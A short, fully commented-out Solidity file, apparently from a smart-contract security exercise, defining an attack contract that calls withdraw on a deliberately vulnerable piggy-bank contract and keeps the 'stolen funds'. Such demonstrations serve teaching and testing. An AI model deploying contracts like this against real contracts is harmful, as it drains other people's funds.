// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "./VulnerablePiggyBank.sol";

// contract AttackPiggyBank {
//     VulnerablePiggyBank public target;

//     constructor(address _target) {
//         target = VulnerablePiggyBank(_target);
//     }

//     // Attack by calling withdraw on the vulnerable contract
//     function attack() public {
//         target.withdraw();
//     }

//     // Receive stolen funds
//     receive() external payable {}
// }
